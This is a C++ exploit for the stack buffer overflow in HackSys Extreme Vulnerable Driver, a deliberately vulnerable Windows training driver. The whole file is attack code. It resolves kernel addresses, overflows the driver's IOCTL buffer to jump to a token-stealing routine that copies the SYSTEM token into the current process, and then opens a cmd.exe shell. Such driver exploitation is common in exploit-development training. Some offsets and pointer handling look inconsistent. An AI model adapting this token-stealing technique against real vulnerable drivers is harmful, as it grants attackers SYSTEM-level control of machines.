
#include <iostream>
#include <Windows.h>
#include <Psapi.h>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

#define	HEVD_BUFFEROVERFLOW_STACK_OFFSET	0x818
#define	HEVD_BUFFEROVERFLOW_STACK_SIZE		0x820

extern "C" inline void AsmFixStack();

using PKTHREAD = PVOID;
using KEGETCURRENTTHREAD = PKTHREAD(NTAPI*)();
using PSINITIALSYSTEMPROCESS = PVOID(NTAPI*)();

KEGETCURRENTTHREAD KeGetCurrentThread{};
PSINITIALSYSTEMPROCESS PsInitialSystemProcess{};

auto getHandle() -> HANDLE {
	auto hHandle = ::CreateFile(TEXT(DEVICE_NAME), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hHandle == nullptr || hHandle == INVALID_HANDLE_VALUE) {
		std::fprintf(stderr, "CreateFile failed with error code : %x\n", ::GetLastError());
		return nullptr;
	}

	std::fprintf(stdout, "Opened handle to device with value : %llx\n", std::uint64_t(hHandle));
	return hHandle;
}

static auto NtkrnlpaBase() -> LPVOID {
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];

	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!std::strcmp((LPSTR)lpfileName, "ntoskrnl.exe")) {
			return lpImageBase[i];
		}
	}

	std::fprintf(stderr, "Failed to get nt base address\n");
	return NULL;
}

static auto ShellCode() -> void {
	
	auto systemEProcess = *(void**)PsInitialSystemProcess;

	auto systemProcessToken = *(void**)((byte*)systemEProcess + 0xf8);

	auto currThread = KeGetCurrentThread();

	// KTHREAD->ApcState->Process = KPROCESS
	auto currProcess = *(void**)((byte*)currThread + 0x70);

	auto currProcessTokenOffset = ((byte*)currProcess + 0x208);
	auto systemProcessTokenOffset = ((byte*)systemEProcess + 0x208);
	*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;

	AsmFixStack();
	
	return;
}

auto resolveNtAddress(void* kernel_base, PCSTR routineName) -> void* {
	if (!kernel_base)	return nullptr;

	HMODULE hUserSpaceBase = ::LoadLibraryA("ntoskrnl.exe");
	if (hUserSpaceBase == nullptr)	return nullptr;

	void* pUserSpaceAddress = ::GetProcAddress(hUserSpaceBase, routineName);
	void* address = (void*)((std::uint64_t)kernel_base +
		((std::uint64_t)pUserSpaceAddress - (std::uint64_t)hUserSpaceBase));

	return address;
}

auto resolveKernelAddress(void* kernel_base) -> void {

	PsInitialSystemProcess = reinterpret_cast<PSINITIALSYSTEMPROCESS>
		(resolveNtAddress(kernel_base, "PsInitialSystemProcess"));

	KeGetCurrentThread = reinterpret_cast<KEGETCURRENTTHREAD>
		(resolveNtAddress(kernel_base, "KeGetCurrentThread"));

	return;
}

auto interact(HANDLE hDevice) -> bool {
	auto* buffer = reinterpret_cast<byte*>(std::malloc(HEVD_BUFFEROVERFLOW_STACK_SIZE));
	if (buffer == nullptr)	return false;

	void* eop = &ShellCode;

	std::memset(buffer, 0x41, HEVD_BUFFEROVERFLOW_STACK_SIZE);
	std::memcpy(buffer + HEVD_BUFFEROVERFLOW_STACK_OFFSET, &eop, sizeof(void*));

	DWORD lpBytesReturned = 0;
	auto ret = ::DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, buffer, HEVD_BUFFEROVERFLOW_STACK_SIZE,
		nullptr, 0, &lpBytesReturned, nullptr);

	if (ret == false)
		std::fprintf(stderr, "Failed to interact with driver with error code : %x\n", ::GetLastError());

	return ret;
}

int main(int argc, char* argv[]) {
	auto hHandle = getHandle();

	void* kernel_base = NtkrnlpaBase();
	if (kernel_base == nullptr)		return EXIT_FAILURE;
	resolveKernelAddress(kernel_base);

	interact(hHandle);

	::system("cmd.exe");

	return EXIT_SUCCESS;
}
